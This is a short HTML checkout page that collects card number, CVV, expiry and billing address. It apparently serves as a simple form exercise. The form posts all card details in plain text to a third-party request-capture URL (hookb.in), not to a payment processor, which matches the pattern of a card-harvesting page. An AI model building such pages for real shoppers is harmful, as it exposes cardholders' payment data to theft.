<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Checkout Form</title>
</head>
<body>
    <form method="post" action="https://hookb.in/XkzM6xMbxntGBBm3JLzg">
        <label for="cc-num">Card Number:</label>
        <input id="cc-num" name="user_cc-num" type="text" required>

            <label for="cvv">CVV:</label>
            <input id="cvv" name="user_cvv" type="text" required>

        <label for="exp-month">Expiration Date:</label>
        <select id="exp-month" name="user_exp-month">
            <option value="1">1 - January</option>
            <option value="2">2 - February</option>
            <option value="3">3 - March</option>
            <option value="4">4 - April</option>
            <option value="5">5 - May</option>
            <option value="6">6 - June</option>
            <option value="7">7 - July</option>
            <option value="8">8 - August</option>
            <option value="9">9 - September</option>
            <option value="10">10 - October</option>
            <option value="11">11 - November</option>
            <option value="12">12 - December</option>
        </select>
        <label for="exp-year">Expiration Year:
        <input type="text" id="exp-year" name="exp-year" required>
        </label>
        <label for="add1">Billing Address Line 1:</label>
        <input type="text" id="add1" name="add1" required>
        <label for="add2">Billing Address Line 2:</label>
        <input type="text" id="add2" name="add2" required>
        <label for="city">City</label>
        <input type="text" id="city" name="city" required>
        <label for="state">State</label>
        <input type="text" id="state" name="state" required>
        <label for="zip">Zip Code</label>
        <input type="text" id="zip" name="zip" required>
        <input type="submit" value="Buy Now!">
    </form>
</body>
</html>
